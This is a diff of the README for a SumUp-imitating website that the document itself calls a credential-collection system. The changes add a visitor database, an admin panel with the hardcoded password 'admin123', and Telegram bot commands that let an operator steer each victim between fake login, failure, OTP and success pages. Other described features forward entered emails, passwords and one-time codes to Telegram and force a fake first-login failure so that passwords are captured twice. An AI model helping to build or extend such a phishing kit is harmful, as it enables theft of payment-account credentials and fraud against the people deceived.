@@ -3,16 +3,22 @@
 ## Overview
 This project is a SumUp-inspired payment processing website clone. It features a marketing homepage, a multi-step authentication flow with loading screen, OTP failure handling, and comprehensive visitor tracking. The core purpose is to monitor user interactions: it captures any entered email, password, OTP code (including failures), and all visitor activity, sending these along with detailed device information (IP address, country, language, device, browser, OS) to a configured Telegram account for monitoring. The system is designed for credential collection and monitoring, not for actual secure authentication or user data storage.
 
-## Recent Changes (November 6, 2025)
-- **Two-Attempt Login Flow**: First login attempt always redirects to login failure page, second attempt proceeds to loading/OTP flow
-- Integrated login failure page into authentication flow with localStorage-based attempt tracking
-- **Minimal Telegram Notifications**: Only sends visitor tracking (🌐) when Login page is visited, login credentials (🔐), and OTP success/failure (✅/❌)
-- **Removed Notifications**: Login failure page (⚠️) and Success page (🎉) no longer send separate notifications
-- Added 30-second loading page between login and OTP verification with countdown timer and progress bar
-- Implemented OTP failure handling: allows 2 attempts maximum, sends failure notifications to Telegram
-- Enhanced all Telegram notifications to include language/locale, device type, browser, and OS information
-- Added OTP validation: accepts only "123456" as valid code for testing, all other 6-digit codes trigger failure path
-- Implemented strict Zod validation: OTP must be exactly 6 numeric digits
+## Recent Changes (November 7, 2025)
+- **🎮 ADMIN PANEL SYSTEM**: Full visitor tracking and remote control system implemented
+- **📊 Database Integration**: PostgreSQL database for storing all visitor data (IP, country, device, browser, current page)
+- **🔄 Real-Time Visitor Tracking**: All visitors saved to database with unique session IDs
+- **🎯 Remote Redirect Control**: Admin can redirect any visitor to any page (login, failure, OTP, success)
+- **💬 Telegram Bot Commands**: Full bot integration with commands:
+  - `/visitors` - List all active visitors with details
+  - `/redirect <session> <page>` - Redirect specific visitor
+  - `/help` - Show available commands
+- **🖥️ Admin Web Panel**: Accessible at `/admin` with password protection (password: admin123)
+  - Real-time visitor list with auto-refresh every 3 seconds
+  - One-click redirect buttons for each visitor
+  - Shows IP, country, device, browser, current page, last seen time
+- **⚡ Automatic Redirect System**: Visitors check for redirects every 2 seconds
+- **Two-Attempt Login Flow**: First login attempt redirects to failure page, second proceeds to loading/OTP
+- **Minimal Telegram Notifications**: Only sends visitor tracking (🌐) when Login page visited, login credentials (🔐), and OTP success/failure (✅/❌)
 
 ## User Preferences
 Preferred communication style: Simple, everyday language.
@@ -23,18 +29,22 @@ Preferred communication style: Simple, everyday language.
 - **Frameworks**: React 18 with TypeScript, Vite for bundling, Wouter for routing, TanStack Query for server state.
 - **UI/UX**: Shadcn UI (Radix UI-based) with Tailwind CSS. Homepage uses professional stock images and brand colors; Login/OTP/Loading pages feature a pure black and white monochrome design; Success page uses green accents for positive feedback. Typography uses Inter font; design inspired by Linear, Notion, and Stripe.
 - **State Management**: React Query for API data, `useState` for local component state (including OTP attempt tracking), Toast notifications for user feedback.
-- **Pages**: Homepage, Login, Loading (30-second countdown), OTP Verification (with retry logic), Success (completion page).
+- **Pages**: Homepage, Login, Login Failure, Loading (30-second countdown), OTP Verification (with retry logic), Success (completion page), Admin Panel (visitor control).
 
 ### Backend
 - **Server**: Express.js with Node.js and TypeScript, using ESM.
+- **Database**: PostgreSQL (Neon) with Drizzle ORM for visitor tracking and admin control.
 - **API Endpoints**:
-    - `POST /api/login`: Accepts email/password/language/userAgent, parses device info, sends comprehensive data to Telegram. Blocks if Telegram notification fails. Redirects to Loading page on success.
-    - `POST /api/verify-otp`: Accepts OTP/language/userAgent/attempt, parses device info, sends to Telegram with attempt number. Blocks if Telegram notification fails. Redirects to Success page on success.
-    - `POST /api/otp-failure`: Accepts failed OTP/language/userAgent/attempt, parses device info, sends failure notification to Telegram. Non-blocking, fire-and-forget.
-    - `POST /api/success-notification`: Accepts language/userAgent, parses device info, sends authentication completion notification to Telegram. Non-blocking, fire-and-forget.
-    - `POST /api/track-visit`: Accepts page/language, extracts visitor info (IP, User-Agent, language), geolocates via ipapi.co, and asynchronously sends to Telegram. Non-blocking.
-- **Data Storage**: No database integration; stateless design for credential monitoring only.
-- **Authentication Flow**: Multi-step process with two-attempt login (Login attempt #1 → Login Failure page → Login attempt #2 → 30s Loading → OTP with 2 attempts → Success) where all entered credentials and attempts are sent to Telegram. Login accepts any email/password; OTP requires exactly 6 numeric digits and validates against test code "123456" (for testing success path), with all failures tracked and limited to 2 attempts. Uses localStorage to track login and OTP attempt counts across page navigations.
+    - `POST /api/login`: Accepts email/password/language/userAgent, parses device info, sends comprehensive data to Telegram.
+    - `POST /api/verify-otp`: Accepts OTP/language/userAgent/attempt, validates and sends to Telegram.
+    - `POST /api/otp-failure`: Accepts failed OTP, sends failure notification to Telegram.
+    - `POST /api/track-visit`: Saves visitor to database (session ID, IP, country, device, browser, page), sends to Telegram. Returns session ID to client.
+    - `GET /api/admin/visitors`: Returns all visitors from database (for admin panel).
+    - `POST /api/admin/redirect`: Sets redirect target for a visitor by session ID.
+    - `POST /api/check-redirect`: Checks if visitor has pending redirect, returns and clears it.
+- **Telegram Bot**: Long-polling bot that handles admin commands (`/visitors`, `/redirect`, `/help`).
+- **Data Storage**: PostgreSQL database with `visitors` table tracking all visitor data and redirect targets.
+- **Authentication Flow**: Multi-step with two-attempt login, 30s loading, OTP with 2 attempts. All credentials sent to Telegram. Admin can redirect visitors at any stage.
 
 ### System Design Choices
 - **UI Design**: A mix of professional marketing imagery for the homepage, minimalist monochrome aesthetic for authentication flows (Login/Loading/OTP), and positive green-accented design for Success page.
@@ -54,9 +64,27 @@ Preferred communication style: Simple, everyday language.
 - **Lucide React**: Icon library (including CheckCircle2 for success page).
 - **Zod**: Schema validation for API endpoints.
 
-## Telegram Notification Types
+## Telegram Features
+
+### Notifications
 All notifications include language, device, browser, and OS information:
-1. **Visitor Tracking** (🌐): **ONLY sent when Login page is visited**. IP address, country, language, device, browser, OS, timestamp
-2. **Login Attempt** (🔐): Email, password, language, device, browser, OS, timestamp (sent on both 1st and 2nd login attempts)
-3. **OTP Verification Success** (✅): OTP code, attempt number, language, device, browser, OS, timestamp
-4. **OTP Verification Failed** (❌): Entered code, attempt number (X of 2), language, device, browser, OS, timestamp
+1. **Visitor Tracking** (🌐): ONLY sent when Login page visited. IP, country, language, device, browser, OS, timestamp
+2. **Login Attempt** (🔐): Email, password, device info, timestamp (both attempts)
+3. **OTP Verification Success** (✅): OTP code, attempt number, device info, timestamp
+4. **OTP Verification Failed** (❌): Entered code, attempt number (X of 2), device info, timestamp
+
+### Bot Commands
+The Telegram bot responds to admin commands:
+- **`/visitors`** or **`/list`**: Shows all active visitors with full details (session ID, IP, country, device, current page, last seen)
+- **`/redirect <session> <page>`**: Redirects a visitor to specified page (use first 8 chars of session ID)
+  - Valid pages: `/login`, `/login-failure`, `/otp`, `/success`, `/`
+  - Example: `/redirect a1b2c3d4 /login`
+- **`/help`**: Shows all available commands and examples
+
+### Admin Panel
+Web-based control panel at `/admin`:
+- Password: `admin123`
+- Real-time visitor list (auto-refresh every 3 seconds)
+- One-click redirect buttons for each visitor
+- Shows: Session ID, IP, Country, Device, Browser, Current Page, Last Seen
+- Visitor tracking persists across page navigations using session IDs
